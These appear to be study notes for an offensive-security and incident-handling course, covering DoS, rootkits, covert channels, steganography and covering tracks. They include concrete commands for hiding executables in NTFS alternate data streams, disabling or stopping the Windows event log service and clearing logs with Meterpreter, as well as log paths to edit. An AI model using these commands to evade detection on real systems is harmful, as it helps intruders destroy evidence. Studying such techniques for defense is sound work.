XSS/SQL Injection/Cmd injection (OWASP Top 10); SQLi: ; query terminator|% match substring| _ match any char
        For malware to bypass application whitelisting: code cave, keyed payload, digital signatures

# Denial of Service
DNS amplification attacks: Send small spoofed DNS query to large DNS servers, all servers respond to target (DoS)
EDNS: DNS query can specify large buffer than 512 bytes (sending 60 bytes, receiving 4000 bytes)
DDoS: Running from botnet | Reflected DDoS: Uses spoofed TCP syn attacks and create DoS on target server
Pulsing Zombies: flood for short while, then goes dormant for a while 
DoS is moving from SYN flood to HTTP floods (very hard to detect)
LOIC (Low Orbit Ion Cannon): TCP conn floods, UDP floods, HTTP floods (most common): Win, Linux, Android

Keeping Access / Covering Tracks
Backdoor: Allow access to PC bypassing security controls
Malware: App level (Trojan tool: Poison Ivy) | User level (Trojan login, ps, ifconfig) | Kernel module
VNC – used for good and bad reasons / works on any platform
	(Client listen mode: 5500 port OR client active connection mode to server on 5900 port)
	WinVNC: Service mode, App mode
Scareware: scaring people to make them believe their systems are compromised
Wrapper and Packer
Shikata Ga Nai (SGN) payload encoding in Metasploit
To bypass sandboxing of software executions, attackers use trigger exploit upon certain conditions or clicks
Wrapper: to hide from Antivirus / IDS / IPS, etc.
Packers & obfuscate: Thwart reverse engineering of malware
-	UPX is most popular packer | Themida | Thinstall, PECompact, PEBundle (commercial)
Defense against Packers: 
-	Immunity Debugger | NSA Ghidra

# Memory Analysis
Tools for Memory dump: fastdump | win32dd | winpmem | FTKImager | ManTech’s mdd | Memoryze MemoryDD.bat
Volatility (free) | Google’s Rekall (free), works by modules (performs memory image analysis)
  Rekall modues: imageinfo, netstat, pslist (wmic process…, Can get parent PID), dlllist (tasklist /m /fi.., Can get cmds run by users via cmd line), netscan (gives process id, TCP/UDP ports), filescan, pedump, modules, pstree

# Rootkit Techniques
-	Altering the trusted components of operating system / keep backdoor access / stealthy control to attacker
o	we advise against the use of bootable Windows PE environments
o	most of them change the hard drive and contaminate evidence
o	instead, use a good bootable Linux environment, such as SIFT
The SANS Investigative Forensics ToolKit (SIFT) image can be helpful: 
https://digital-forensics.sans.org/community/downloads
- This VMware appliance includes numerous analysis tools:
      Sleuth Kit | log2timeline | Wireshark | Volatility | ssdeep and md5deep & numerous others!!

Remote root access via trojan: telnet | rsh | SSH | TCP or UDP connection to specific port (inetd, tcpd)
Local privilege escalation via trojan: chfn (user properties) | chsh | passwd | su
Hide processes by trojan: ps | top | pidof | killall | crontab
Hide network usage by trojan: netstat | ifconfig 
Hide files by trojan: ls | find | du
Hide events by not logging via trojan: syslogd
** ONLY ADMINS can DEBUG PROGRAMS in WINDOWS **

4 types of kernel mode rootkits are available (Linux and Windows): Mostly modules and drivers
-	Loadable kernel modules (UNIX) and device drivers (Windows) (lsmod cmd to list kernel modules in Linux)
-	Altering Kernel in memory (/dev/kmem on Linux, System Memory Map on Windows)
-	Changing kernel file on hard drive (vmlinuz on Linux, ntoskrnl.exe (NTLDR verifies integrity) & win32k.sys files in Windows)
-	Virtualizing the system

Tool to create rootkits: Rooty (Linux), Avatar (Windows, this tool has ability for custom encryption for C&C), Fontanini (Linux 3.0 and higher kernels, #insmod rootkit.ko)

# Rootkit Defenses
-	Lockdown systems (CIS guidelines)
-	Detection tools (Linux): Rootcheck (OSSEC), Rootkit Hunter, Chkrootkit (user mode & kernel mode Rootkits)
-	Detection tools (Windows): Sophos Anti-Rootkit, McAfee Rootkit Remover, GMER
File Integrity detection:
-	OSSEC is very good | Tripwire & AIDE  tools look for changes in critical system files
Network Intelligence/Forensics: Rita | Security Onion

# Covering Tracks in Linux
Linux file paths, where attackers want to hide data: /tmp, /dev, /etc, /usr/local/man, /usr/src
Log editing: /etc/sysctl.conf   AND  /var/log/secure, /var/log/messages, /var/log/httpd/error_log, etc.
 (Generally written in ASCII)
Accountability in UNIX
/var/run/utmp (currently logged in users) | /var/log/wtmp (past user logins) | /var/log/btmp (bad logins for failed attemps) | /var/log/lastlog (login ID, port, time of last login)
-	These are not in ASCII (need tools from Packet storm security to edit them)

# Covering Tracks in Windows
Firewall logs in Windows: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
Hiding files: type hack.exe > notepad.exe:stream1.exe
Unhiding files: more < notepad.exe:stream1.exe    
 Alternate data streams: dir /r    |    Get-Item *   -stream *               (ADS is only for NTFS file system)
-	Cannot create data streams based on reserved windows filnames (CON, COM1, COM2, LPT1, AUX, etc.)

Log editing in Windows: C:\Windows\System32\winevt\Logs    (Application.evtx, Security.evtx, System.evtx)
Metasploit’s meterpreter command: clearev  can delete event logs on Windows
https://jpcertcc.github.io/ToolAnalysisResultSheet/
https://attack.mitre.org/matrices/enterprise/
Use of DeepBlueCLI tool for event log analysis on Windows (powershell tool)
Defenses:
-	User Behavior Entity Analysis (UBEA) (identify odd behavior)
o	JPCert logon trace, Rapid7 InsightIDR, Microsoft ATA (Advanced Threat Analytics)
To disable event log service in Windows: sc config eventlog start= disabled
	To enable it back: sc config eventlog start= auto
To stop even logging in Windows: net stop eventlog
	To start the logging: net start eventlog
To check the event log service in Windows: sc query eventlog
Incident Handling analysis
-	Gaps in EventRecordID indicate the deletion of log entry

# Covering Tracks in Networks
ICMP Tunnel Tools: Ptunnel (TCP over ICMP Echo/Reply, authn client using md5 challenge/response, has proxy), Loki (Linux Shell), ICMPShell (Linux), PingChat (Win chat program), ICMPCmd (Win cmd.exe access)

Covert TCP: Covert channel using either TCP or IP header (transfer of files) | IP_ID field for covert_tcp data
-	Bounce mode (Routing thru internet sites like Google)
Covert_TCP allows for transmitting information by entering ASCII data in the following TCP header fields:
•	TCP initial sequence number
•	TCP acknowledgement sequence number
When using the initial sequence number mode of Covert_TCP, the TCP three-way handshake is never completed: the client will send the ASCII data that is to be covertly transferred using the initial sequence number field, and the server will always respond with a RST packet.

Other Covert Channels: DNSCat2, Quick UDP Internet Connection (QUIC), SCTP (Stream Control Transmission Protocol), Gcat (c2 traffic via gmail)
Defenses:
-	VSAgent puts all parameters in __VIEWSTATE

# Steganography
Jsteg: Hides in jpeg files | MP3Stego: Hides in mpeg files | S-Mail: Hides data in EXE and DLL | Invisible Secrets: Hides data in banner ads that appear on websites | Stash: Hides data in variety of image format | Hydan: Hides data in Win/Linux/Unix executables (same size maintained)
-	Hydan encrypts with Blowfish, Uses polymorphic coding to hide data, Add/Subtract, 0/1 value, Hides 1 byte per 150 bytes of data.

OpenStego: Embeds data and digital watermarks in images | SilentEye: Embeds encrypted data and other files into JPEG, BMP, and WAV formats | OpenPuff: Images, Audio, Video, Flash, etc. with multi-password and multiple rounds of encryption

Detection: StegExpose
Tools Summary
•	Nmap: port scanner and OS fingerprinting
•	Netcat: Backdoors and file transfer
•	Enum: Determining users and groups, and password guessing (Windows)
•	Metasploit: Exploiting vulnerable targets
•	John the Ripper: Password cracking
•	Fgdump: Remote SAM password hash dumper (Windows)

*** END OF DOCUMENT ***
